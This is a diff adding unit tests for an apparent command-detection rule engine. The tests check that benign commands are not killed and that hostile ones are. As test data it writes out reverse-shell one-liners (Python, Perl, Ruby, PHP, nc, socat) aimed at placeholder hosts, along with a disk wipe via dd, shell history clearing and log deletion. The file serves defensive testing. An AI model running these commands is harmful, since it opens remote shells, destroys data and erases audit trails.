@@ -387,5 +387,50 @@ class TestProtectedTreeSubtree(unittest.TestCase):
         self.assertEqual(self.killed, [20])
 
 
+class TestRuleTuning(unittest.TestCase):
+    """The other over-broad KILL rules: common commands must not be executed."""
+
+    @classmethod
+    def setUpClass(cls):
+        A.load_rules()
+
+    def killed(self, binary, cmdline):
+        e = entry(binary, cmdline)
+        return any(r.action in ("KILL", "BLOCK", "QUARANTINE") and A.match_rule(e, r)
+                   for r in A.rules)
+
+    def test_docs_mentioning_reverse_shell_not_killed(self):
+        self.assertFalse(self.killed("/usr/bin/grep", "grep -r 'shell reverse' docs"))
+        self.assertFalse(self.killed("/usr/bin/python3", "python3 shell_reverse_test.py"))
+
+    def test_last_dns_flag_not_killed(self):
+        self.assertFalse(self.killed("/usr/bin/last", "last -d"))
+        self.assertTrue(self.killed("/usr/bin/lastb", "lastb --clear"))
+
+    def test_dd_read_is_not_wiping(self):
+        self.assertFalse(self.killed("/usr/bin/dd", "dd if=/dev/sda of=/tmp/backup.img bs=1M"))
+        self.assertFalse(self.killed("/usr/bin/dd", "dd if=/dev/zero of=/tmp/x bs=1M count=1"))
+        self.assertTrue(self.killed("/usr/bin/dd", "dd if=/dev/zero of=/dev/sdb bs=1M"))
+
+    def test_plain_interpreter_use_not_killed(self):
+        self.assertFalse(self.killed("/usr/bin/python3", "python3 -c print(1)"))
+        self.assertFalse(self.killed("/usr/bin/perl", "perl -e print"))
+
+    def test_reverse_shells_still_killed(self):
+        cases = [
+            ("/usr/bin/python3", "python3 -c 'import socket,subprocess;s=socket.socket();subprocess.call([\"/bin/sh\"])'"),
+            ("/usr/bin/perl", "perl -e 'use Socket;socket(S,PF_INET,1,6);exec(\"/bin/sh\")'"),
+            ("/usr/bin/ruby", "ruby -rsocket -e 'exec(\"/bin/sh\")'"),
+            ("/usr/bin/php", "php -r '$s=fsockopen(\"1.2.3.4\",4444);exec(\"/bin/sh\");'"),
+            ("/usr/bin/nc", "nc -e /bin/sh 10.0.0.1 4444"),
+            ("/usr/bin/socat", "socat TCP:10.0.0.1:4444 EXEC:/bin/sh"),
+        ]
+        for binary, cmdline in cases:
+            self.assertTrue(self.killed(binary, cmdline), cmdline)
+
+    def test_history_clear_and_log_deletion_still_killed(self):
+        self.assertTrue(self.killed("/usr/bin/bash", "history -c"))
+        self.assertTrue(self.killed("/usr/bin/rm", "rm -f /var/log/wtmp"))
+
 if __name__ == "__main__":
     unittest.main(verbosity=1)
